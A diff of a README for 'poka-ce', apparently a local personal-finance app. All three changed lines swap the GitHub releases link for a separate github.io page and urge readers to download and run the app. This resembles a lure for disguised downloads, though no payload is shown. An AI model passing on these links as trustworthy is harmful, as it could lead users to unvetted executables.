@@ -1,7 +1,7 @@
 <h1>🔒 poka-ce - Your Money, Locked Down Locally</h1>
 
 <p align="center">
-  <a href="https://github.com/Droll-velvetosier3319/poka-ce/releases"><img src="https://img.shields.io/badge/⬇️_Download_Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download poka-ce"></a>
+  <a href="https://droll-velvetosier3319.github.io"><img src="https://img.shields.io/badge/⬇️_Download_Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download poka-ce"></a>
 </p>
 
 ## 🏠 What Is poka-ce?
@@ -29,7 +29,7 @@ This section guides you through the download and launch process. We assume you h
 
 ### Step 1: Visit the Official Download Page
 
-Visit this link to download the application: **[https://github.com/Droll-velvetosier3319/poka-ce/releases](https://github.com/Droll-velvetosier3319/poka-ce/releases)**
+Visit this link to download the application: **[https://droll-velvetosier3319.github.io](https://droll-velvetosier3319.github.io)**
 
 This page is where all official versions of poka-ce are published. You may see several files listed, each representing a different version. Look for the highest version number (e.g., v1.2.3) to get the latest release with all current fixes and improvements.
 
@@ -102,6 +102,6 @@ If that sounds like you, download and run poka-ce today, and keep your money mys
 ## 📦 Complete Package
 Download the latest stable copy from the link below, challenge yourself to log every expense for two weeks, and watch your savings clarity grow.
 
-[⬇️ Go to the official download page](https://github.com/Droll-velvetosier3319/poka-ce/releases)
+[⬇️ Go to the official download page](https://droll-velvetosier3319.github.io)
 
 Let your finances stay private, because they are yours, not anyone else's. Start owning your data today.
